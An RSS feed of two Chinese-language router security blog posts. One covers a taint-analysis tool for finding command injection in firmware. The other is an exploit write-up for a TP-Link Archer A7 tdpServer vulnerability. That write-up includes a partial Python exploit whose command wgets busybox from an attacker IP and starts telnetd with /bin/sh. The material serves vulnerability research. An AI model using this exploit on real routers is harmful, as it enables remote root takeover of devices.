<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>路由器安全 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/</link>
        <description>Recent content in 路由器安全 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 09 Aug 2025 07:13:29 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>路由器固件漏洞自动化挖掘：基于污点分析的规模化漏洞检测</title>
        <link>http://localhost:1313/p/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%9F%BA%E4%BA%8E%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%84%E6%A8%A1%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</link>
        <pubDate>Sat, 09 Aug 2025 07:13:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%9F%BA%E4%BA%8E%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%84%E6%A8%A1%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</guid>
        <description>&lt;h1 id=&#34;基于污点分析的路由器固件漏洞规模化挖掘&#34;&gt;基于污点分析的路由器固件漏洞规模化挖掘
&lt;/h1&gt;&lt;p&gt;在最近几个月的工作中，我们开发了一套基于污点分析的自动化工具，用于检测路由器中的安全漏洞。该工具针对D-Link DIR-878路由器1.12A1固件中的CVE-2019-8312至CVE-2019-8319等命令注入漏洞进行了优化设计，目标是实现比人工分析更快的漏洞发现速度。&lt;/p&gt;
&lt;h2 id=&#34;技术方案&#34;&gt;技术方案
&lt;/h2&gt;&lt;h3 id=&#34;现有工具局限性&#34;&gt;现有工具局限性
&lt;/h3&gt;&lt;p&gt;虽然Triton和bincat等成熟污点分析工具存在，但它们不支持目标设备使用的MIPS架构，因此我们选择基于angr框架开发定制方案。&lt;/p&gt;
&lt;h3 id=&#34;angr符号执行的瓶颈&#34;&gt;angr符号执行的瓶颈
&lt;/h3&gt;&lt;p&gt;初始方案使用angr的符号执行功能进行动态污点跟踪，但面临状态爆炸问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单个函数分析超时设置为2分钟&lt;/li&gt;
&lt;li&gt;实际分析耗时超过2小时&lt;/li&gt;
&lt;li&gt;存在内存泄漏导致内存耗尽&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;改进方案到达定义分析&#34;&gt;改进方案：到达定义分析
&lt;/h3&gt;&lt;p&gt;最终采用angr的Reaching Definitions静态分析技术：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;构建函数内的use-def关系图&lt;/li&gt;
&lt;li&gt;将原子操作（寄存器/栈变量/堆变量）建模为图节点&lt;/li&gt;
&lt;li&gt;通过图遍历分析用户输入（source）是否影响危险函数（sink）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例漏洞代码分析：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;querystring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_querystring_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;querystring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;echo %s &amp;gt;&amp;gt; /tmp/log&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;对应的use-def关系图清晰地展示了从&lt;code&gt;get_querystring_value&lt;/code&gt;到&lt;code&gt;system&lt;/code&gt;的污染传播路径。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现成果&#34;&gt;漏洞发现成果
&lt;/h2&gt;&lt;h3 id=&#34;prolink-prc2402m路由器&#34;&gt;PROLiNK PRC2402M路由器
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;发现20个命令注入漏洞（10个可通过WAN接口未授权访问）&lt;/li&gt;
&lt;li&gt;典型漏洞模式：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;qos_sta_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cli_list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;web_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cli_list&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/sbin/sta_qos.sh setup %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cli_list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;额外发现：
&lt;ul&gt;
&lt;li&gt;硬编码后门密码&lt;code&gt;user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;栈溢出漏洞（未检查边界的sprintf）&lt;/li&gt;
&lt;li&gt;拒绝服务漏洞（通过超大循环值导致无限循环）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;d-link-dir系列路由器&#34;&gt;D-Link DIR系列路由器
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DIR-1960：发现4个需认证的HNAP API命令注入&lt;/li&gt;
&lt;li&gt;DIR-X1560（ARM架构）：
&lt;ul&gt;
&lt;li&gt;逆向分析复杂的分层架构（DAL/RCL/RUT）&lt;/li&gt;
&lt;li&gt;通过MDMOID映射表定位漏洞链&lt;/li&gt;
&lt;li&gt;最终发现4个深层命令注入漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术演示&#34;&gt;技术演示
&lt;/h2&gt;&lt;p&gt;工具将分析时间从2小时缩短至2分钟，效率提升60倍。目前主要支持命令注入检测，未来计划扩展缓冲区溢出、UAF等漏洞类型的检测能力。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;完整漏洞细节和厂商修复时间线请参阅原文技术分析部分。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行</title>
        <link>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Thu, 07 Aug 2025 06:02:51 +0800</pubDate>
        
        <guid>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建
&lt;/h1&gt;&lt;p&gt;调试和分析主要在路由器环境中进行。通过USB-TTL设备获取路由器交互式shell的方法已有相关指南，这里不再赘述。OpenWRT提供了&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a51&#34; &gt;指南1&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a52&#34; &gt;指南2&lt;/a&gt;说明具体操作。&lt;/p&gt;
&lt;p&gt;对于代码分析，采用了bindiff方法来定位漏洞函数。可从以下链接下载有漏洞和已修复的固件版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修复版本：Archer A7(US)_V5_200220&lt;/li&gt;
&lt;li&gt;漏洞版本：Archer C7(US)_V5_190726&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意Archer C7和A7型号共享大多数二进制文件，因此分析C7或A7固件镜像均可。&lt;/p&gt;
&lt;h1 id=&#34;bindiff分析&#34;&gt;BinDiff分析
&lt;/h1&gt;&lt;p&gt;首先从固件中提取MIPS(Big Endian)二进制文件并加载到Ghidra中。按照&lt;a class=&#34;link&#34; href=&#34;%e9%a1%b9%e7%9b%ae%e9%93%be%e6%8e%a5&#34; &gt;BinDiffHelper项目&lt;/a&gt;的说明进行操作，同时下载安装bindiff6。&lt;/p&gt;
&lt;p&gt;使用Ghidra和Bindiff后，发现几个相似度很低的函数。跟踪这些地址发现，FUN_00414D14似乎指向一个函数，这可能是存在漏洞的函数。&lt;/p&gt;
&lt;h1 id=&#34;静态分析&#34;&gt;静态分析
&lt;/h1&gt;&lt;p&gt;根据ZDI网站上的CVE报告描述，漏洞存在于默认监听UDP端口20002的tdpServer服务中。当解析slave_mac参数时，该服务未正确验证用户输入的字符串就直接用于执行系统调用。&lt;/p&gt;
&lt;p&gt;在反编译代码中搜索slave_mac字符串，发现多个结果。第一个搜索结果中，有多个地方包含slave_mac字符串，其中还包括对FUN_00414d14函数的引用。&lt;/p&gt;
&lt;p&gt;关键的字符串&amp;quot;tdpUciInterface.c:644&amp;quot;,&amp;ldquo;About to get slave mac %s info&amp;quot;只有一处引用，地址为0x40e7e4。根据Bindiff，这里很可能没有变化或差异。&lt;/p&gt;
&lt;h1 id=&#34;寻找system调用&#34;&gt;寻找system()调用
&lt;/h1&gt;&lt;p&gt;根据CVE描述，我们需要寻找攻击者可能控制的system()函数调用。在FUN_00414d14函数中发现了三个system调用，其中一个特别有趣：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;snprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interesting_acStack7432&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1ff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s&#34;&gt;&amp;#34;lua -e &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;require(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;luci.controller.admin.onemesh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;).sync_wifi_specified({mac=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to_be_controlled_acStack4248&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h1&gt;&lt;p&gt;在这个漏洞函数中，slave_mac值可以控制传递给system()的参数。我们可以通过以下步骤实现利用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;为MIPS Big Endian设置GDB服务器&lt;/li&gt;
&lt;li&gt;测试与tdpServer的连接&lt;/li&gt;
&lt;li&gt;制作有效载荷&lt;/li&gt;
&lt;li&gt;完整漏洞利用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;制作数据包&#34;&gt;制作数据包
&lt;/h2&gt;&lt;p&gt;数据包由16字节的包头和最大0x410字节的JSON有效载荷组成。第一个字节表示tdp版本，这个固件只接受版本1的数据包。&lt;/p&gt;
&lt;p&gt;数据包校验和计算使用CRC-32算法。校验通过后，有效载荷会使用IV和DecryptKey通过AES_DECRYPT在CBC模式下解密。&lt;/p&gt;
&lt;h2 id=&#34;命令注入&#34;&gt;命令注入
&lt;/h2&gt;&lt;p&gt;slave_mac字段用于将字符写入文件p。该字段有17个字符的限制。命令注入工作原理如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-lua&#34; data-lang=&#34;lua&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lua&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;luci.controller.admin.onemesh&amp;#34;).sync_wifi_specified({mac=&amp;#34; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;INJECT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HERE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#34;})&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们使用printf将字符追加到文件中，通过发送多个数据包构建完整脚本后执行。&lt;/p&gt;
&lt;h1 id=&#34;完整漏洞利用&#34;&gt;完整漏洞利用
&lt;/h1&gt;&lt;p&gt;要实现反向shell，可以从我们的机器下载busybox，然后使用telnetd获取反向shell，通过wget命令逐个字符写入文件并执行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;zlib&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.0.125&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;8090&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;COMMAND&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wget http://&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/busybox-mips -P /tmp;chmod +x /tmp/busybox-mips;/tmp/busybox-mips telnetd -l /bin/sh -p &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;;wget http://&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/index.jpg -P /www;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;完整Python利用代码&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该漏洞允许攻击者在root用户上下文中执行任意代码，危害极大。建议用户及时更新固件版本。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
